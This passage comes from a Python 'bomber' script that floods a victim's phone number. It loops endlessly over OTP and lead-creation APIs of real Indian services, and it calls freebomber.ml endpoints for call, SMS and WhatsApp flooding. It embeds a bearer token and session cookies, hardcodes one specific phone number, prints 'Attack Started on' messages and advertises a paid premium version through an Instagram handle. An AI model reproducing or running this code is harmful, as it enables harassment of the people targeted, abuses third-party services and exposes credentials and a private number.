                    'x-header-deviceid': '574a1fe8-a63a-421b-90f4-d73d0d276e60',
                }

                json_data2 = {
                    'phoneNo': number,
                    'countryAreaCode': '91',
                    'language': 'English',
                }
                response2 = requests.post('https://api.jeet11.com/account-service/external/v1.0.0/sendOtp', headers=headers2, json=json_data2)


            def gomechanic():
                headers = {
                    'Accept': '*/*',
                    'Accept-Language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,eo;q=0.6,tr;q=0.5',
                    'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJuYmYiOjE2NjA1MTU2NDAuMCwiaWF0IjoxNjYwNTE1NjQwLjAsImp0aSI6ImI0YmMzY2FmNWQxZWE5OWRjOTZiNDMzY2NjNDMwMjRlMDIzYjQwYzZiNDlmMTE3YmMwOTk4ZjYxZTdkMjVmMzYxNTVhZTlkMjE2MTZlNzk1IiwiZXhwIjoxNjYzMTA3NjQwLjAsImF1ZCI6IjMiLCJzY29wZXMiOltdLCJzdWIiOiIxNjYwNTE1NjQwODcifQ.DvSAJJYe6zUGovXqVK6zs-g7ccYE3O--anVOp-j5L60-Bvt4mXYavcgwUd1R8V-4zqVt-CRhhxUyvI227mCfHe4Jts9To5N-XT9PotfXchxlAZYGegwGs_xpSuFgsbYZYJw4DaQ1wT7d4JtDROyneeqoRUXAwORz78WBetYMT5H_aZGqxK2El7QDFO6vgXP0N7arIsOO8RDH2qT9a02f2R--2KSgtpZhnruA_XHC7ZIHjEC97rkuS-tZQwofgSLmiyJCTrpZjeJM7UF_Pvhq20ftz6VYHMVgsplKvjVDr4KCE7oJkWqt-qAJOVvugPlsW7hjhTDPLQg8MQf9VOuRA-aolE2EU1T1UwVzUSDQJuhYFpwWRmGHug5kgnQR8VjNi_631oPCutsW66fUA4MxYlvEaVzwtImpb0LAApQdnr6frNrXk3W_ARau2cTOXhpo8qk-z4JlA1Mrawgc_pbDYL_TpxMD6d545v6l4NbPTr7aV0IKng3DfAG_7oP_ktp5cngZO7rYvL6ElD4wprFbzob3PiFBwqBaOOmGKJaOMrhqaQhO0-wI6cyHUq4dE5f0lPhphe0WsqzoLfnh2dnAwCKeFeFzIMeCpJfvatzi53I49uLZUBBwJmzKYlUKSbx0jA0q4fCrrniW-gGkcjlv86k-lwUKqHq_2hF4Vr8MrwA',
                    'Connection': 'keep-alive',
                    # Already added when you pass json=
                    # 'Content-Type': 'application/json',
                    'DNT': '1',
                    'Origin': 'https://gomechanic.in',
                    'Referer': 'https://gomechanic.in/',
                    'Sec-Fetch-Dest': 'empty',
                    'Sec-Fetch-Mode': 'cors',
                    'Sec-Fetch-Site': 'cross-site',
                    'User-Agent': 'Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.188 Safari/537.36 CrKey/1.54.250320',
                }

                json_data = {
                    'name': '',
                    'car_type_id': 115,
                    'mobile': number,
                    'location': 'Gurgaon',
                    'utm_source': '',
                    'source_id': 15,
                }
                response = requests.post('https://gomechanic.app/api/v1/oauth/leads/create_new_lead', headers=headers, json=json_data)


            try:
                while True:
                    flipkart()
                    jeet()
                    apollo()
                    medbuzz()
                    gomechanic()
                    #macdonal()
                    nira()
                    #fastpronumber()
                    #industrialapi()
                    #fastpronumber()
                    #rummyapi()
                    #nira()
                    #rummytime()
                    #rummyapi()
                    #snapmint()
            except:
                _under_()
                chutmarike('Bombing stopped..')
                _under_()
                sys.exit()
                
                
                

        elif self.data_main==2:
            _cls_front_under()
            chutmarike('For call , custom msg and fastest api buy the premium script ..')
            _under_()
            chutmarike('To buy script contact me on instagram : @sincryptzork')
            sys.exit()
            number2 = input(r+"\xe2\x94\x94\xe2\x94\x80"+w+"\\033[1;37mEnter the 10 Digit number +91 : "+r)
            print(r+"\xe2\x94\x94\xe2\x94\x80"+w+"\\033[1;37mAttack Started on >> "+y+"+91"+number2+r)
            
            def callphp():
                #
                cookies13 = {
                    'cf_clearance': 'ej05R5JA19ztAZQH0STVHkREtY1SwUTD747zRNsJBiM-1661065258-0-150',
                    '_pk_id.376245.6a19': '3f6ba316cc7c0364.1660033473.',
                }

                headers13 = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'DNT': '1',
                    'Connection': 'keep-alive',
                    # Requests sorts cookies= alphabetically
                    # 'Cookie': 'cf_clearance=ej05R5JA19ztAZQH0STVHkREtY1SwUTD747zRNsJBiM-1661065258-0-150; _pk_id.376245.6a19=3f6ba316cc7c0364.1660033473.',
                    'Upgrade-Insecure-Requests': '1',
                    'Sec-Fetch-Dest': 'document',
                    'Sec-Fetch-Mode': 'navigate',
                    'Sec-Fetch-Site': 'same-origin',
                    'Cache-Control': 'max-age=0',
                    # Requests doesn't support trailers
                    # 'TE': 'trailers',
                }

                params13 = {
                    'sr': number2,
                    'key': '@itztktricks',
                    'submit': 'Submit Query',
                }


                response13 = requests.get('https://freebomber.ml/tk/call/call.php', params=params13, cookies=cookies13, headers=headers13)
            try:
                while True:
                    callphp()
                    callphp()
            except:
                _under_()
                chutmarike('Call Bombing Stopped ..')
                _under_()
                sys.exit()
        elif self.data_main==3:
            _cls_front_under()
            number98 = input(r+"\xe2\x94\x94\xe2\x94\x80"+w+"\\033[1;37mEnter the 10 Digit number +91 : "+r)
            print(r+"\xe2\x94\x94\xe2\x94\x80"+w+"\\033[1;37mAttack Started on >> "+y+"+91"+number98+r)
            
            def mixbimb():
                cookies122 = {
                    'cf_clearance': 'ej05R5JA19ztAZQH0STVHkREtY1SwUTD747zRNsJBiM-1661065258-0-150',
                    '_pk_id.376245.6a19': '3f6ba316cc7c0364.1660033473.',
                }

                headers122 = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Referer': 'https://freebomber.ml/tk/mix/',
                    'DNT': '1',
                    'Connection': 'keep-alive',
                    # Requests sorts cookies= alphabetically
                    # 'Cookie': 'cf_clearance=ej05R5JA19ztAZQH0STVHkREtY1SwUTD747zRNsJBiM-1661065258-0-150; _pk_id.376245.6a19=3f6ba316cc7c0364.1660033473.',
                    'Upgrade-Insecure-Requests': '1',
                    'Sec-Fetch-Dest': 'document',
                    'Sec-Fetch-Mode': 'navigate',
                    'Sec-Fetch-Site': 'same-origin',
                    'Sec-Fetch-User': '?1',
                    'Cache-Control': 'max-age=0',
                    # Requests doesn't support trailers
                    # 'TE': 'trailers',
                }

                params122 = {
                    'sr': '9528027588',
                    'key': '@itztktricks',
                    'submit': 'Submit Query',
                }
                response = requests.get('https://freebomber.ml/tk/mix/hard-bomber.php', params=params122, cookies=cookies122, headers=headers122)
            try:
                while True:
                    mixbimb()
            except:
                _under_()
                chutmarike('Sms2 stopped ..')
                _under_()
                sys.exit()
        elif self.data_main==4:
            chutmarike('Coming soon ..')
        elif self.data_main==5:
            _cls_front_under()
            chutmarike('For call , custom msg and fastest api buy the premium script ..')
            _under_()
            chutmarike('To buy script contact me on instagram : @sincryptzork')
            sys.exit()
            number9 = input(r+"\xe2\x94\x94\xe2\x94\x80"+w+"\\033[1;37mEnter the 10 Digit number +91 : "+r)
            print(r+"\xe2\x94\x94\xe2\x94\x80"+w+"\\033[1;37mAttack Started on >> "+y+"+91"+number9+r)
            
            def whatsappbomb():
                cookies45 = {
                    'cf_clearance': 'ej05R5JA19ztAZQH0STVHkREtY1SwUTD747zRNsJBiM-1661065258-0-150',
                    '_pk_id.376245.6a19': '3f6ba316cc7c0364.1660033473.',
                }

                headers45 = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Referer': 'https://freebomber.ml/tk/whatsapp/',
                    'DNT': '1',
                    'Connection': 'keep-alive',
                    # Requests sorts cookies= alphabetically
                    # 'Cookie': 'cf_clearance=ej05R5JA19ztAZQH0STVHkREtY1SwUTD747zRNsJBiM-1661065258-0-150; _pk_id.376245.6a19=3f6ba316cc7c0364.1660033473.',
                    'Upgrade-Insecure-Requests': '1',
                    'Sec-Fetch-Dest': 'document',
                    'Sec-Fetch-Mode': 'navigate',
                    'Sec-Fetch-Site': 'same-origin',
                    'Sec-Fetch-User': '?1',
                    'Cache-Control': 'max-age=0',
                    # Requests doesn't support trailers
                    # 'TE': 'trailers',
                }

                params45 = {
                    'sr': number9,
                    'key': '@itztktricks',
                    'submit': 'Submit Query',
                }

                response45 = requests.get('https://freebomber.ml/tk/whatsapp/whatsapp-bomber.php', params=params45, cookies=cookies45, headers=headers45)
            try:
                while True:
                    whatsappbomb()
            except:
                _under_()
                chutmarike('Whatsapp Bombing Stopped ..')
                _under_()
                sys.exit()
        elif self.data_main==6:
            os.system('python update.py' if os.name=='nt' else 'python3 update.py')
        elif self.data_main==7:
            _under_()
            chutmarike('Exiting ..')
            _under_()
            sys.exit()

    
try:
    samayuser = input(r+"\xe2\x94\x94\xe2\x94\x80"+w+"\\033[1;37mEnter the Username : "+r)
    samaypassword = input(r+"\xe2\x94\x94\xe2\x94\x80"+w+"\\033[1;37mEnter the Password : "+r)
except:
    sys.exit()

    
if __name__ == '__main__':
    bhai = Samay(samayuser,samaypassword)
    bhai.Passwordencrypt()
    
